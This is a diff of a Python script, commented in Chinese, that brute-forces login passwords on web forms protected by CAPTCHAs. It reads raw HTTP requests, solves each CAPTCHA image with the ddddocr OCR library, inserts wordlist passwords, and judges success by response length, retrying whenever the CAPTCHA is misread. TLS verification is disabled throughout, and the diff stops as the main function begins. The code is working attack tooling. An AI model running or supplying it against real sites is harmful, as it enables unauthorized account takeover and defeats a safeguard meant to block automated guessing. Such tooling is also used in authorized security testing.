@@ -1,103 +1,107 @@
 import sys
 
+import argparse
 import ddddocr
 import requests
-import argparse
-
+from urllib.parse import quote
 # 网络请求使用的协议
 protocol = "http://"
-
-
-# 传入数据包内容，返回method,url,header,body
-# 数据包错误返回0,0,0,0
-def prepareInfo(content=""):
-    content = content.replace("\r\n", "\n")
-    # 分离http header和http body
+replaceCaptcha = "####"
+replacePass = "****"
+#解析http请求
+#传入http数据包
+#返回method,url,header,httpBody。GET请求的body为None
+def prepareHttpRequestContent(content=""):
+    content=content.replace("\r\n","\n")
+    # 分离post请求的 header和body
     httpRequest = content.split("\n\n", 1)
-    # 初始化要返回的数据
-    method = url = head = body = ""
-    header = {}
-    if len(httpRequest) == 2:  # POST请求
-        head = httpRequest[0].split("\n")
-        body = httpRequest[1]
-    elif len(httpRequest) == 1:  # GET请求
-        head = httpRequest[0].split("\n")
-    else:  # 数据包错误
-        return 0, 0, 0, 0
-    # 解析http header的数据包
-    for i, line in enumerate(head):
+    method = url = httpHead = httpBody = ""
+    httpHeader = {}
+    if len(httpRequest)==2:#post请求
+        httpHead=httpRequest[0].split("\n")
+        httpBody=httpRequest[1]
+    else:#get请求
+        httpHead=content.strip().split("\n")
+    for i, line in enumerate(httpHead):
         if i == 0:  # 数据包首行
             tmp = line.split(" ")
-            if len(tmp) != 3:  # 数据包错误
-                return 0, 0, 0, 0
+            if len(tmp)!=3:
+                print("数据包中的第一行错误")
+                sys.exit(-1)
             method = tmp[0].lower()
-            url = tmp[1]
-        else:  # 其他头字段
+            url=tmp[1]
+        else:#解析http header
             tmp = line.split(":", 1)
-            if len(tmp) < 2:  # 数据包错误
-                return 0, 0, 0, 0
-            header[tmp[0].lower().replace(" ", "")] = tmp[1].replace(" ", "")
-    return method, url, header, body
+            if len(tmp)!=2:
+                print("数据包中的header错误")
+                sys.exit(-1)
+            httpHeader[tmp[0].lower().replace(" ", "")] = tmp[1].replace(" ", "")
+    if "host" not in httpHeader:
+        print("httpHeader中没有host")
+        sys.exit(-1)
+    url=protocol+httpHeader["host"]+url
+    return method,url,httpHeader,httpBody
 
 
-# 识别验证码
-# 传入domain,method,url,header,body返回验证码
-def getCaptcha(method, url, header, body):
-    # 从header中的host这种提取域名
-    if header["host"] != "":
-        url = protocol + header["host"] + url
-    else:
-        return -1
-
-    if method == "post":
-        resp = requests.post(url, headers=header, data=body, verify=False)
-    else:
-        resp = requests.get(url, headers=header, verify=False)
-    captcha = ddddocr.DdddOcr().classification(resp.content)
-    print("验证码：{0}".format(captcha), end=",")
+#获取并识别验证码
+#返回识别后的验证码
+def getCaptcha(method, url, header, data):
+    try:
+        if method=="post":
+            resp = requests.post(url, headers=header, data=data, verify=False)
+        else:
+            resp = requests.get(url, headers=header, verify=False)
+    except Exception as e:
+        print("获取验证码失败，正在重试", e)
+        return getCaptcha(method, url, header, data)
+    try:
+        open("test.jpg","wb").write(resp.content)
+        captcha = ddddocr.DdddOcr().classification(resp.content)
+    except Exception as e:
+        print(e)
+        sys.exit(-1)
     return captcha
 
-
-# 发起网络请求
-# 传入domain, method, url, header, body返回当前数据包长度
-def blastRequest(method, url, header, body):
-    if header["host"] != "":
-        url = protocol + header["host"] + url
+#爆破的请求
+#返回response header中的content-length
+def passwordRequest(method, url, header, data):
+    try:
+        if method == "post":
+            resp = requests.post(url, headers=header, data=data, verify=False)
+        else:
+            resp = requests.get(url, headers=header, verify=False)
+    except Exception as e:
+        print("爆破请求失败，正在重试",e)
+        return passwordRequest(method, url, header, data)
+    if "Content-Length" in resp.headers:
+        return resp.headers["Content-Length"]
     else:
-        return -1
-    if method == "post":
-        resp = requests.post(url, headers=header, data=body, verify=False)
-    else:
-        resp = requests.get(url, headers=header, verify=False)
-    return resp.headers["Content-Length"]
+        return len(resp.content)
 
+#联动验证码请求和爆破的请求
+#返回conten-length和验证码
+def prepareRequest(passwordRequestContent,captchaRequestContent, captchaErrorLength):
+    #格式化验证码请求
+    method, url, header, data = prepareHttpRequestContent(captchaRequestContent)
+    #获取验证码
+    captcha=getCaptcha(method, url, header, data)
+    #将验证码替换到爆破的数据包中
+    passwordTmpRequestContent = passwordRequestContent.replace(replaceCaptcha, captcha)
+    #格式化爆破的数据包
+    method, url, header, data = prepareHttpRequestContent(passwordTmpRequestContent)
+    contentLength=passwordRequest(method, url, header, data)
+    if int(contentLength)==int(captchaErrorLength):
+        print("验证码识别错误，正在重试,{}".format(captcha))
+        return prepareRequest(passwordRequestContent,captchaRequestContent, captchaErrorLength)
+    return contentLength,captcha
 
-# 传入替换密码后的content和验证码content以及验证码错误的数据包长度
-def allRequest(reqContent, captchaContent, errLen, rcaptcha="####"):
-    cmethod, curl, cheader, cbody = prepareInfo(captchaContent)
-    if cmethod == 0:
-        return 0
-    captcha = getCaptcha(cmethod, curl, cheader, cbody)
-    if captcha == 0:
-        return 0
-    reqContent = reqContent.replace(rcaptcha, captcha)
-    rmethod, rurl, rheader, rbody = prepareInfo(reqContent)
-    len = blastRequest(rmethod, rurl, rheader, rbody)
-    if len == errLen:
-        print("验证码识别错误，正在重试")
-        allRequest(reqContent, captchaContent, errLen, captcha)
-    else:
-        return len
-
-
-# 替换请求包中要爆破的数据
-def prepare(reqContent, rep, captchaContent, errLen):
-    reqContent = reqContent.replace("****", rep)
-    len = allRequest(reqContent, captchaContent, errLen)
+#爆破数据包准备
+def prepare(passwordRequestContent, password, captchaRequestContent, captchaErrorLength):
+    passwordRequestContent = passwordRequestContent.replace("****", password)
+    len,captcha = prepareRequest(passwordRequestContent, captchaRequestContent, captchaErrorLength)
     if int(len) <= 0:
         sys.exit(len)
-    print("爆破的密码为：{0},返回的长度为:{1}".format(rep, len))
-
+    print("识别出来的验证码是：{0},爆破的密码为：{1},返回的长度为:{2}".format(captcha,quote(password), len))
 
 # 读取文件，并爆破
 def main(blastFile, captchaFile, passFile, errLen):
